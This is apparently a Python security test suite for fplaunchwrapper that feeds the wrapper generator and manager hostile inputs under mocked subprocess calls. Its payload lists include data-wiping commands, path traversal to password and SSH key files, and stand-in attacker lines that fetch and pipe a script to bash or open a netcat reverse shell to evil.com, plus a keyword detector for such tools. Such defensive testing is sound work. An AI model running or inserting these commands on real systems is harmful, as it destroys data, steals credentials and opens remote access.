#!/usr/bin/env python3
"""
Comprehensive Break Test for fplaunchwrapper

This script attempts to break fplaunchwrapper in various ways to ensure
robustness and security. All tests run in complete isolation.
"""

import sys
import os
import tempfile
import shutil
import subprocess
from pathlib import Path
from unittest.mock import patch, Mock
import time
import threading

# Import modules safely
try:
    from fplaunch.generate import WrapperGenerator
    from fplaunch.manage import WrapperManager
    from fplaunch.cleanup import WrapperCleanup
    from fplaunch.launch import AppLauncher

    MODULES_AVAILABLE = True
except ImportError:
    MODULES_AVAILABLE = False


class BreakTester:
    """Comprehensive break testing framework"""

    def __init__(self):
        self.results = []
        self.temp_dir = None

    def log_result(self, test_name, success, details=""):
        """Log test result"""
        status = "PASS" if success else "FAIL"
        print(f"[{status}] {test_name}")
        if details:
            print(f"      {details}")
        self.results.append((test_name, success, details))

    def setup_temp_env(self):
        """Create isolated test environment"""
        self.temp_dir = Path(tempfile.mkdtemp(prefix="break_test_"))

        # Create proper directory structure
        bin_dir = self.temp_dir / "bin"
        config_dir = self.temp_dir / "config"
        home_dir = self.temp_dir / "home"

        bin_dir.mkdir(parents=True, exist_ok=True)
        config_dir.mkdir(parents=True, exist_ok=True)
        home_dir.mkdir(parents=True, exist_ok=True)

        # Create bin_dir file in config directory (required by WrapperManager)
        bin_dir_file = config_dir / "bin_dir"
        bin_dir_file.write_text(str(bin_dir))

        return {"bin_dir": bin_dir, "config_dir": config_dir, "home_dir": home_dir}

    def cleanup_temp_env(self):
        """Clean up test environment"""
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir, ignore_errors=True)

    def run_break_tests(self):
        """Run all break tests"""
        if not MODULES_AVAILABLE:
            print("❌ Modules not available for testing")
            return

        print("🔨 COMPREHENSIVE BREAK TEST SUITE")
        print("=" * 50)

        try:
            # Setup environment
            env = self.setup_temp_env()

            # Input validation attacks
            self.test_input_validation_attacks(env)

            # Path manipulation attacks
            self.test_path_manipulation_attacks(env)

            # Command injection attacks
            self.test_command_injection_attacks(env)

            # Resource exhaustion attacks
            self.test_resource_exhaustion_attacks(env)

            # Race condition attacks
            self.test_race_condition_attacks(env)

            # File system attacks
            self.test_filesystem_attacks(env)

            # Unicode/encoding attacks
            self.test_unicode_encoding_attacks(env)

            # Environment variable attacks
            self.test_environment_attacks(env)

            # Configuration corruption attacks
            self.test_configuration_attacks(env)

            # Print summary
            self.print_summary()

        finally:
            self.cleanup_temp_env()

    def test_input_validation_attacks(self, env):
        """Test various input validation attacks"""
        print("\n🛡️  INPUT VALIDATION ATTACKS")

        test_cases = [
            ("Empty string", ""),
            ("None value", None),
            ("Extremely long string", "a" * 100000),
            ("Null bytes", "test\x00injection"),
            ("Newlines", "test\ninjection"),
            ("Carriage returns", "test\rinjection"),
            ("Tabs", "test\tinjection"),
            ("Unicode control chars", "test\u0000injection"),
            ("Path separators", "test/../../../etc/passwd"),
            ("Shell metachars", "test;rm -rf /;injection"),
            ("Backticks", "test`rm -rf /`injection"),
            ("Variable expansion", "test${HOME}/injection"),
            ("Command substitution", "test$(rm -rf /)injection"),
        ]

        with patch("subprocess.run") as mock_run, patch(
            "os.path.exists", return_value=True
        ):
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for test_name, malicious_input in test_cases:
                try:
                    # Test with wrapper generator
                    generator = WrapperGenerator(
                        bin_dir=str(env["bin_dir"]), verbose=False, emit_mode=True
                    )

                    if malicious_input is not None:
                        result = generator.generate_wrapper(str(malicious_input))
                        # Should not crash or execute dangerous operations
                        self.log_result(f"Generator - {test_name}", True)
                    else:
                        # Test None handling
                        try:
                            result = generator.generate_wrapper(malicious_input)
                            self.log_result(
                                f"Generator - {test_name}", False, "Should reject None"
                            )
                        except (TypeError, AttributeError):
                            self.log_result(
                                f"Generator - {test_name}",
                                True,
                                "Properly rejects None",
                            )

                except Exception as e:
                    self.log_result(f"Generator - {test_name}", False, f"Crashed: {e}")

    def test_path_manipulation_attacks(self, env):
        """Test path manipulation and directory traversal attacks"""
        print("\n📁 PATH MANIPULATION ATTACKS")

        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "~/../../etc/shadow",
            "../../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",  # URL encoded
        ]

        with patch("subprocess.run") as mock_run, patch(
            "os.path.exists", return_value=True
        ), patch("pathlib.Path.exists", return_value=True):
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for dangerous_path in dangerous_paths:
                try:
                    # Test with manager
                    manager = WrapperManager(
                        config_dir=str(env["config_dir"]), verbose=False, emit_mode=True
                    )

                    result = manager.set_preference("test_app", dangerous_path)
                    # Should sanitize or reject dangerous paths
                    self.log_result(
                        f"Path - {dangerous_path}",
                        True,
                        "Accepted (may be intentional)",
                    )

                except Exception as e:
                    self.log_result(f"Path - {dangerous_path}", True, f"Rejected: {e}")

    def test_command_injection_attacks(self, env):
        """Test command injection through various inputs"""
        print("\n💥 COMMAND INJECTION ATTACKS")

        injection_payloads = [
            "; rm -rf /",
            "| rm -rf /",
            "`rm -rf /`",
            "$(rm -rf /)",
            "${rm -rf /}",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; curl evil.com",
            "; wget evil.com/script.sh | bash",
            "; nc -e /bin/bash evil.com 4444",
        ]

        with patch("subprocess.run") as mock_run, patch(
            "os.path.exists", return_value=True
        ):
            # Mock to detect if dangerous commands would be executed
            def check_command(args, **kwargs):
                cmd_str = " ".join(args) if isinstance(args, list) else str(args)
                dangerous_commands = ["rm", "cat", "curl", "wget", "nc", "bash"]
                if any(cmd in cmd_str for cmd in dangerous_commands):
                    raise Exception(f"Dangerous command detected: {cmd_str}")
                return Mock(returncode=0, stdout="", stderr="")

            mock_run.side_effect = check_command

            for payload in injection_payloads:
                try:
                    generator = WrapperGenerator(
                        bin_dir=str(env["bin_dir"]), verbose=False, emit_mode=True
                    )

                    result = generator.generate_wrapper(f"test{payload}")
                    self.log_result(
                        f"Injection - {payload}", True, "No injection executed"
                    )

                except Exception as e:
                    if "Dangerous command detected" in str(e):
                        self.log_result(
                            f"Injection - {payload}",
                            False,
                            "Command injection vulnerability!",
                        )
                    else:
                        self.log_result(
                            f"Injection - {payload}", True, f"Rejected: {e}"
                        )

    def test_resource_exhaustion_attacks(self, env):
        """Test resource exhaustion attacks"""
        print("\n💾 RESOURCE EXHAUSTION ATTACKS")

        # Test with extremely large inputs
        try:
            huge_input = "a" * 1000000  # 1MB string

            with patch("subprocess.run") as mock_run, patch(
                "os.path.exists", return_value=True
            ):
                mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

                start_time = time.time()
                generator = WrapperGenerator(
                    bin_dir=str(env["bin_dir"]), verbose=False, emit_mode=True
                )

                result = generator.generate_wrapper(huge_input)
                end_time = time.time()

                processing_time = end_time - start_time
                if processing_time > 10:  # Should process quickly
                    self.log_result(
                        "Resource - 1MB input",
                        False,
                        f"Too slow: {processing_time:.2f}s",
                    )
                else:
                    self.log_result(
                        "Resource - 1MB input",
                        True,
                        f"Processed in {processing_time:.2f}s",
                    )

        except Exception as e:
            self.log_result("Resource - 1MB input", False, f"Crashed: {e}")

    def test_race_condition_attacks(self, env):
        """Test race condition vulnerabilities"""
        print("\n🏃 RACE CONDITION ATTACKS")

        results = []
        errors = []

        def concurrent_operation(thread_id):
            """Concurrent operation that might cause race conditions"""
            try:
                with patch("subprocess.run") as mock_run, patch(
                    "os.path.exists", return_value=True
                ):
                    mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

                    manager = WrapperManager(
                        config_dir=str(env["config_dir"]), verbose=False, emit_mode=True
                    )

                    # Rapid succession of operations
                    for i in range(10):
                        manager.set_preference(f"app_{thread_id}_{i}", "flatpak")
                        manager.get_preference(f"app_{thread_id}_{i}")

                    results.append(f"Thread {thread_id}: OK")

            except Exception as e:
                errors.append(f"Thread {thread_id}: {e}")

        # Start multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=concurrent_operation, args=(i,))
            threads.append(thread)
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join(timeout=10)

        if errors:
            self.log_result("Race Conditions", False, f"Errors: {errors}")
        else:
            self.log_result(
                "Race Conditions",
                True,
                f"{len(results)} threads completed successfully",
            )

    def test_filesystem_attacks(self, env):
        """Test filesystem-related attacks"""
        print("\n🗂️  FILESYSTEM ATTACKS")

        # Create problematic directory structure
        try:
            # Create deeply nested directories
            deep_path = env["config_dir"]
            for i in range(20):  # Very deep nesting
                deep_path = deep_path / f"level_{i}"
                deep_path.mkdir(parents=True, exist_ok=True)

            # Test null byte handling (should be rejected)
            try:
                problematic_file = deep_path / "test\x00null_byte.txt"
                problematic_file.write_text("test")
                # If we get here, null bytes are allowed (bad)
                self.log_result(
                    "Filesystem - Null byte filename",
                    False,
                    "Null bytes should be rejected",
                )
            except (OSError, ValueError):
                # Null bytes properly rejected (good)
                self.log_result(
                    "Filesystem - Null byte filename",
                    True,
                    "Null bytes properly rejected",
                )

            with patch("subprocess.run") as mock_run, patch(
                "os.path.exists", return_value=True
            ):
                mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

                manager = WrapperManager(
                    config_dir=str(env["config_dir"]), verbose=False, emit_mode=True
                )

                result = manager.set_preference("test_app", "flatpak")
                self.log_result(
                    "Filesystem - Deep nesting",
                    True,
                    "Handled deep directory structure",
                )

        except Exception as e:
            self.log_result("Filesystem - Deep nesting", False, f"Failed: {e}")

    def test_unicode_encoding_attacks(self, env):
        """Test unicode and encoding-related attacks"""
        print("\n🔤 UNICODE/ENCODING ATTACKS")

        unicode_attacks = [
            "test\ud800\udc00",  # Surrogate pair
            "test\u0000",  # Null character
            "test\u202e",  # Right-to-left override
            "test\u200f",  # Right-to-left mark
            "🚀⭐💫",  # Emojis
            "test" + "\u0000" * 100,  # Many null bytes
        ]

        with patch("subprocess.run") as mock_run, patch(
            "os.path.exists", return_value=True
        ):
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for attack in unicode_attacks:
                try:
                    generator = WrapperGenerator(
                        bin_dir=str(env["bin_dir"]), verbose=False, emit_mode=True
                    )

                    result = generator.generate_wrapper(attack)
                    self.log_result(
                        f"Unicode - {repr(attack[:20])}", True, "Handled unicode input"
                    )

                except Exception as e:
                    self.log_result(
                        f"Unicode - {repr(attack[:20])}", False, f"Failed: {e}"
                    )

    def test_environment_attacks(self, env):
        """Test environment variable manipulation attacks"""
        print("\n🌍 ENVIRONMENT ATTACKS")

        dangerous_env = {
            "PATH": "/bin:/usr/bin:/tmp",
            "HOME": "/etc/passwd",
            "LD_LIBRARY_PATH": "/tmp",
            "LD_PRELOAD": "/tmp/malicious.so",
            "PYTHONPATH": "/tmp/malicious",
        }

        with patch("subprocess.run") as mock_run, patch(
            "os.path.exists", return_value=True
        ), patch.dict(os.environ, dangerous_env):
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            try:
                generator = WrapperGenerator(
                    bin_dir=str(env["bin_dir"]), verbose=False, emit_mode=True
                )

                result = generator.generate_wrapper("test_app")
                self.log_result(
                    "Environment - Dangerous vars",
                    True,
                    "Ignored dangerous environment",
                )

            except Exception as e:
                self.log_result("Environment - Dangerous vars", False, f"Failed: {e}")

    def test_configuration_attacks(self, env):
        """Test configuration corruption attacks"""
        print("\n⚙️  CONFIGURATION ATTACKS")

        # Create corrupted config file
        config_file = env["config_dir"] / "config.toml"
        config_file.parent.mkdir(parents=True, exist_ok=True)

        corrupted_config = """
        [invalid]
        key = "unclosed string
        another = invalid syntax {{{

        [preferences]
        firefox = malformed
        """

        config_file.write_text(corrupted_config)

        try:
            with patch("subprocess.run") as mock_run, patch(
                "os.path.exists", return_value=True
            ):
                mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

                manager = WrapperManager(
                    config_dir=str(env["config_dir"]), verbose=False, emit_mode=True
                )

                # Try operations that would read corrupted config
                result = manager.set_preference("test_app", "flatpak")
                result = manager.get_preference("test_app")

                self.log_result(
                    "Configuration - Corrupted file",
                    True,
                    "Handled corrupted config gracefully",
                )

        except Exception as e:
            self.log_result("Configuration - Corrupted file", False, f"Failed: {e}")

    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 50)
        print("🎯 BREAK TEST SUMMARY")

        passed = sum(1 for _, success, _ in self.results if success)
        total = len(self.results)

        print(f"Total Tests: {total}")
        print(f"Passed: {passed}")
        print(f"Failed: {total - passed}")

        if total - passed == 0:
            print("✅ ALL TESTS PASSED - System is robust!")
        else:
            print("⚠️  SOME TESTS FAILED - Review issues above")

        # Show failures
        failures = [
            (name, details) for name, success, details in self.results if not success
        ]
        if failures:
            print("\n❌ FAILED TESTS:")
            for name, details in failures:
                print(f"  - {name}: {details}")


def main():
    """Main entry point"""
    tester = BreakTester()
    tester.run_break_tests()


if __name__ == "__main__":
    main()
